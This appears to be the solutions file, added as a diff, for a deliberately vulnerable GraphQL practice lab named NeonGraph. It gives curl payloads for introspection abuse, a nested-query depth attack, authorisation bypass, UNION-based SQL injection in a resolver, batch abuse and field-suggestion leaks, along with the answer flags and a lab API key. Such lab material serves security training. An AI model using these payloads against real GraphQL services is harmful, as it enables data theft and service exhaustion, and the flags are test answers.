@@ -1,0 +1,127 @@
+===============================================================================
+  NeonGraph — GraphQL Lab Solutions (Port 5015)
+===============================================================================
+
+CHALLENGE 1: Introspection — Schema Discovery
+Flag: FLAG{gql_1ntr0sp3ct10n}
+
+  Introspection is enabled. Query the full schema to discover hidden types:
+
+  curl -X POST http://localhost:5015/graphql \
+    -H "Content-Type: application/json" \
+    -d '{"query": "{ __schema { types { name fields { name } } } }"}'
+
+  This reveals the AdminSecret type. Then query it:
+
+  curl -X POST http://localhost:5015/graphql \
+    -H "Content-Type: application/json" \
+    -d '{"query": "{ adminSecrets { key value } }"}'
+
+  Also exposed via admin's secretNote field:
+
+  curl -X POST http://localhost:5015/graphql \
+    -H "Content-Type: application/json" \
+    -d '{"query": "{ users { username secretNote } }"}'
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 2: Depth Attack — Resource Exhaustion
+Flag: FLAG{gql_d3pth_4ttack}
+
+  No query depth limiting. Send a deeply nested query (depth > 10):
+
+  curl -X POST http://localhost:5015/graphql \
+    -H "Content-Type: application/json" \
+    -d '{"query": "{ users { posts { author { posts { author { posts { author { posts { author { posts { author { username } } } } } } } } } } } }"}'
+
+  This triggers the depth attack detection. Then query health:
+
+  curl -X POST http://localhost:5015/graphql \
+    -H "Content-Type: application/json" \
+    -d '{"query": "{ health }"}'
+
+  The health response now includes the flag.
+  POST /reset to clear the depth flag.
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 3: Authorization Bypass — Private Posts
+Flag: FLAG{gql_4uth_byp4ss}
+
+  The posts resolver returns ALL posts including private ones (isPrivate=1).
+  No authorization check is performed.
+
+  curl -X POST http://localhost:5015/graphql \
+    -H "Content-Type: application/json" \
+    -d '{"query": "{ posts { title content isPrivate } }"}'
+
+  The private post titled "CLASSIFIED" (or similar) contains the flag.
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 4: SQL Injection in Resolver
+Flag: FLAG{gql_1nj3ct10n}
+
+  The searchUsers resolver uses string interpolation:
+    f"SELECT * FROM users WHERE username LIKE '%{name}%'"
+
+  Inject a UNION SELECT to extract from the flags table:
+
+  curl -X POST http://localhost:5015/graphql \
+    -H "Content-Type: application/json" \
+    -d '{"query": "{ searchUsers(name: \"'"'"' UNION SELECT 1,flag_value,flag_name,'"'"'user'"'"','"'"'key'"'"' FROM flags--\") { username role } }"}'
+
+  Simplified (if your shell handles escaping):
+    searchUsers(name: "' UNION SELECT 1,flag_value,flag_name,'user','key' FROM flags--")
+
+  The flag value appears in the username field of the results.
+
+  Alternative — extract all users (always true):
+    searchUsers(name: "' OR '1'='1")
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 5: Batch Attack
+Flag: FLAG{gql_b4tch_4ttack}
+
+  The /graphql endpoint accepts JSON arrays for batched queries.
+  Send more than 5 queries in a single batch:
+
+  curl -X POST http://localhost:5015/graphql \
+    -H "Content-Type: application/json" \
+    -d '[
+      {"query": "{ health }"},
+      {"query": "{ health }"},
+      {"query": "{ health }"},
+      {"query": "{ health }"},
+      {"query": "{ health }"},
+      {"query": "{ health }"}
+    ]'
+
+  When batch size > 5, the response includes the flag in the
+  "extensions" field: { "batchFlag": "FLAG{gql_b4tch_4ttack}" }
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 6: Field Suggestion Information Leak
+Flag: (admin's apiKey field — accessible via introspection)
+
+  When you query with a misspelled field name, error messages suggest
+  valid field names, leaking schema information:
+
+  curl -X POST http://localhost:5015/graphql \
+    -H "Content-Type: application/json" \
+    -d '{"query": "{ users { secretNot } }"}'
+
+  Error: "Cannot query field 'secretNot'. Did you mean 'secretNote'?"
+
+  This reveals hidden fields even if introspection were disabled.
+  Query the discovered field:
+
+  curl -X POST http://localhost:5015/graphql \
+    -H "Content-Type: application/json" \
+    -d '{"query": "{ users { username apiKey secretNote } }"}'
+
+  Admin's apiKey: sk-admin-n30n-7x9k2
+
+===============================================================================
